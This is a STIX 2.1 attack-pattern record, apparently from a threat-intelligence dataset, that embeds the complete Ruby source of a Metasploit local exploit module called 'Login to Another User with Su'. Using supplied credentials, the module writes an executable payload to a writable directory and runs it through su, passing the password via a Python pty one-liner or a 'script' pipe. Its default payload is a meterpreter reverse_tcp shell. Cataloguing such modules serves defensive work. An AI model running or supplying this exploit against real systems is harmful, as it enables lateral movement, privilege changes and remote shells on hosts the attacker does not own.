{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--da6582b6-efe4-4af4-af79-4c73889a173f",
    "created": "2024-08-14T16:59:32.398866Z",
    "modified": "2024-08-14T16:59:32.39887Z",
    "name": "Login to Another User with Su on Linux / Unix Systems",
    "description": " This module attempts to create a new login session by invoking the su command of a valid username and password.  If the login is successful, a new session is created via the specified payload.  Because su forces passwords to be passed over stdin, this module attempts to invoke a psuedo-terminal with python python3, or script.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/su_login.rb",
            "external_id": "su_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  include Msf::Post::Linux\n  include Msf::Post::Linux::System\n  include Msf::Post::Unix\n  include Msf::Post::File\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::EXE\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  Rank = NormalRanking\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Login to Another User with Su on Linux / Unix Systems',\n        'Description' => %q{\n          This module attempts to create a new login session by\n          invoking the su command of a valid username and password.\n\n          If the login is successful, a new session is created via\n          the specified payload.\n\n          Because su forces passwords to be passed over stdin, this\n          module attempts to invoke a psuedo-terminal with python,\n          python3, or script.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => 'Gavin Youker <youkergav@gmail.com>',\n        'DisclosureDate' => '1971-11-03',\n        'Platform' => ['linux', 'unix'],\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [\n            'Linux x86', {\n              'Arch' => ARCH_X86,\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'Linux x86_64', {\n              'Arch' => ARCH_X64,\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' }\n            }\n          ],\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' },\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('USERNAME', [true, 'Username to authenticate with.', 'root']),\n      OptString.new('PASSWORD', [false, 'Password to authenticate with.'])\n    ])\n\n    register_advanced_options([\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ])\n  end\n\n  # Main function to run the exploit.\n  def exploit\n    fail_with(Failure::NoAccess, 'username not found') unless user_exists(datastore['USERNAME'])\n\n    # Upload the payload and stager files.\n    print_status('Uploading payload to target')\n    payload_file = build_payload(generate_payload_exe, datastore['WritableDir'])\n\n    # Execute the payload.\n    print_status('Attempting to login with su')\n    exec_payload(datastore['USERNAME'], datastore['PASSWORD'], payload_file)\n  end\n\n  # Function to check if target is exploitable.\n  def check\n    # Make sure su is installed.\n    unless command_exists?('su')\n      vprint_error('su not found on target machine')\n      return CheckCode::Safe\n    end\n\n    # Make sure a program to run the exploit is installed.\n    prorgam = find_exec_program\n    unless prorgam\n      vprint_error('One of the following programs must be installed on target: python, python3, script')\n      return CheckCode::Safe\n    end\n\n    # Make sure script requirements are met.\n    if prorgam == 'script'\n      # Check for command dependencies.\n      commands = ['sh', 'sleep', 'echo', 'base64']\n      for command in commands\n        unless command_exists?(command)\n          vprint_error(\"The '#{command}' must be installed on target\")\n          return CheckCode::Safe\n        end\n      end\n\n      # Check that the script program is apart of the util-linux package.\n      version = find_util_linux_verison\n      unless version\n        vprint_error(\"The 'script' program must be of the 'util-linux' package\")\n        return CheckCode::Safe\n      end\n\n      # Check that util-linux in of a compatible version.\n      unless version >= Rex::Version.new('2.25')\n        vprint_error(\"The package 'util-linux' must be version 2.25 or higher\")\n        return CheckCode::Safe\n      end\n    end\n\n    return CheckCode::Appears\n  end\n\n  # Function to build and write the payload.\n  def build_payload(contents, dir)\n    fail_with(Failure::NoAccess, \"directory '#{dir}' is on a noexec mount point\") if noexec?(dir)\n\n    filepath = \"#{dir}/#{Rex::Text.rand_text_alpha(8)}\"\n\n    write_file(filepath, contents)\n    chmod(filepath, 755)\n    register_files_for_cleanup(filepath)\n\n    return filepath\n  end\n\n  # Function to execute the payload through the stager.\n  def exec_payload(username, password, payload)\n    # Load the exploit based on avaliable options.\n    if password\n      program = find_exec_program\n      if ['python', 'python3'].include?(program)\n        vprint_status(\"Using '#{program}' to load exploit\")\n\n        python = 'import os, pty, base64;'\\\n                 'read = lambda fd: os.read(fd, 1024);'\\\n                 \"write = lambda fd: base64.b64decode('#{Rex::Text.encode_base64(password)}');\"\\\n                 \"command = 'su - #{username} -c #{payload}';\"\\\n                 'os.close(0);'\\\n                 'pty.spawn(command.split(), read, write);'\n\n        command = \"#{program} -c \\\"#{python}\\\"\"\n      elsif program == 'script'\n        vprint_status(\"Using 'script' to load exploit\")\n        command = \"sh -c 'sleep 1; echo #{Rex::Text.encode_base64(password)} | base64 -d' | script /dev/null -qc 'su - #{username} -c #{payload}'\"\n      end\n    else\n      command = \"su - #{username} -c #{payload}\"\n    end\n\n    # Execute the exploit.\n    response = cmd_exec(command)\n\n    fail_with(Failure::NoAccess, 'invalid password') if response.to_s.include?('Authentication failure')\n    return true\n  end\n\n  def find_exec_program\n    return 'python' if command_exists?('python')\n    return 'python3' if command_exists?('python3')\n    return 'script' if command_exists?('script')\n\n    return false\n  end\n\n  # Function to check if the user exists.\n  def user_exists(username)\n    return get_users.any? { |user| user[:name] == username }\n  end\n\n  # Function to get util-linux version.\n  def find_util_linux_verison\n    response = cmd_exec('script -V')\n    # rubocop:disable Lint/MixedRegexpCaptureTypes\n    match = response.match(/script from util-linux (?<version>\\d.\\d+(.\\d+)?)/)\n    # rubocop:enable Lint/MixedRegexpCaptureTypes\n\n    return false unless match\n\n    return Rex::Version.new(match[:version])\n  end\nend\n",
    "x_mitre_disclosure_date": "1971-11-03",
    "x_mitre_platforms": [
        "['linux', 'unix']"
    ]
}